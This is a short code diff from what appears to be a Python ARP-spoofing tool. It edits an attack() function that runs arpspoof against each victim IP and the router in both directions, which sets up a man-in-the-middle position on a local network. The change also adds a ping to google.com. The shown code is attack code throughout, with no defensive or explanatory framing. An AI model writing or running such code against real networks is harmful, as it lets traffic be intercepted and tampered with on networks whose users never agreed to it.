@@ -13,8 +13,10 @@ victims = None
 
 def attack(ips):
 	for ip in ips:
-		os.system(f"xterm -hold -e arpspoof -i {interface} -t {ip} {router_ip} &")
-		os.system(f"xterm -hold -e arpspoof -i {interface} -t {router_ip} {ip} &")
+		os.system(f"xterm -e arpspoof -i {interface} -t {ip} {router_ip} &")
+		os.system(f"xterm -e arpspoof -i {interface} -t {router_ip} {ip} &")
+
+	os.system("xterm -e ping google.com")
 
 
 def init_forward():
